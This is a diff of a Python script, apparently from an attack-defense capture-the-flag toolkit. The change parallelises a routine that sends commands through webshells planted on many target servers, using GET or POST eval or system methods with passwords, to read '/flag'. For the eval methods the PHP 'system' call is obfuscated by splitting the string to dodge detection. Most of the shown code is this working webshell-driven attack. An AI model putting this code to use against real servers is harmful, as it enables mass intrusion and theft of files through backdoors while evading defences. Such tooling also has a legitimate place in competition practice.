@@ -8,6 +8,7 @@ import json
 import base64
 import time
 import init_shell
+from multiprocessing import Pool
 
 strCMD = ""
 localtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
@@ -23,7 +24,6 @@ sServerFlagFile = "/flag"
 # flag样例，记得修改chkFlag函数中的正则表达式
 sFlag = "flag{glzjin_wants_a_girl_friend}"
 sFlag = "hctf{7c70e603ed882d9b772106ff10257151887d0ff6}"
-
 
 def chkFlag(sInput):
     sReturn = ""
@@ -159,77 +159,77 @@ def checkShell(lstURL):
 
         chkShell_get(strURI)
 
+def getFlag_sub(sURL):
+    # 尝试5次，间隔0.1秒
+    for i in range(5):
+        strReturn = ""
+        tFlag = ""
+        lstTmp = sURL.split(',')
+        strURL = lstTmp[0]
+        strMethod = lstTmp[1]
+        strPWD = lstTmp[2]
+        strCMD = "cat " + sServerFlagFile
+        
+        # 调试：查看页面及尝试次数
+        # print("%s<==%d" % (strURL,i))
+
+        if strMethod == "get_eval":
+            # 混淆cmd命令
+            # strCMD = "system(\"%s\");" % strCMD
+            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
+            strReturn = exp_get_eval(strURL, strPWD, strCMD)
+
+            if (strReturn != False):
+                tFlag = chkFlag(strReturn)
+
+        elif strMethod == "get_system":
+            strReturn = exp_get_system(strURL, strPWD, strCMD)
+
+            if (strReturn != False):
+                tFlag = chkFlag(strReturn)
+
+        elif strMethod == "post_eval":
+            # 混淆cmd命令
+            # strCMD = "system(\"%s\");" % strCMD
+            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
+            strReturn = exp_post_eval(strURL, strPWD, strCMD)
+
+            if (strReturn != False):
+                tFlag = chkFlag(strReturn)
+
+        elif strMethod == "post_system":
+            strReturn = exp_post_system(strURL, strPWD, strCMD)
+
+            if (strReturn != False):
+                tFlag = chkFlag(strReturn)
+        else:
+            pass
+
+        if (tFlag != ""):
+            break
+        time.sleep(0.1)
+    return tFlag
 
 def getFlag(lstURL):
     print("...开始获取flag")
-    # 请确认flag文件及位置
-    iSuccess = 0
+    pro_start_time = time.time()
+    
     lstFlag = []
-
-    for s in lstURL:
-        # 尝试5次，间隔0.1秒
-        for i in range(5):
-            strReturn = ""
-            tFlag = ""
-            lstTmp = s.split(',')
-            strURL = lstTmp[0]
-            strMethod = lstTmp[1]
-            strPWD = lstTmp[2]
-            strCMD = "cat " + sServerFlagFile
-            
-            # 调试：查看页面及尝试次数
-            # print("%s<==%d" % (strURL,i))
-
-            if strMethod == "get_eval":
-                # 混淆cmd命令
-                # strCMD = "system(\"%s\");" % strCMD
-                strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
-                strReturn = exp_get_eval(strURL, strPWD, strCMD)
-
-                if (strReturn != False):
-                    iSuccess += 1
-                    tFlag = chkFlag(strReturn)
-
-            elif strMethod == "get_system":
-                strReturn = exp_get_system(strURL, strPWD, strCMD)
-
-                if (strReturn != False):
-                    iSuccess += 1
-                    tFlag = chkFlag(strReturn)
-
-            elif strMethod == "post_eval":
-                # 混淆cmd命令
-                # strCMD = "system(\"%s\");" % strCMD
-                strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
-                strReturn = exp_post_eval(strURL, strPWD, strCMD)
-
-                if (strReturn != False):
-                    iSuccess += 1
-                    tFlag = chkFlag(strReturn)
-
-            elif strMethod == "post_system":
-                strReturn = exp_post_system(strURL, strPWD, strCMD)
-
-                if (strReturn != False):
-                    iSuccess += 1
-                    tFlag = chkFlag(strReturn)
-            else:
-                pass
-
-            if (tFlag != ""):
-                if(tFlag not in lstFlag):
-                    lstFlag.append(tFlag)
-                break
-            time.sleep(0.1)
+    tmpList = []
+    # 并发进程数:8
+    pool = Pool(8)
+    
+    tmpList= pool.map(getFlag_sub, lstURL)
+    lstFlag=list(set(tmpList))
 
     localtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
     common.file_write(sLocalFlagFile,localtime)
+    
     for flag in lstFlag:
-        
         print(flag)
         common.file_write(sLocalFlagFile,flag)
 
-    print("...获取flag结束,成功访问 %d 个shell,获得 %d 个flag,更多信息查看log.txt" % (iSuccess, len(lstFlag)))
+    print("...获取flag结束,获得 %d 个flag,耗时: %s 秒, 更多信息查看log.txt" % (len(lstFlag),str(round(time.time() - pro_start_time, 2))))
     return
 
 
